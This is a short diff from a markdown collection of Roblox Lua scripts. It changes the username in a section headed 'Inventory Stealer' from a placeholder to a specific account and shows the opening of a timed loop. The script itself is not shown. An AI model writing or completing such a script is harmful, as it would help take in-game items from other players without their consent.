@@ -258,7 +258,7 @@ end
 ## Inventory Stealer
 
 ```lua
-local myUsername = "YourRobloxUsername"  -- Replace with your exact Roblox username!
+local myUsername = "DeathKiller19386"  -- your roblox username
 
 while true do
     wait(math.random(10,30))
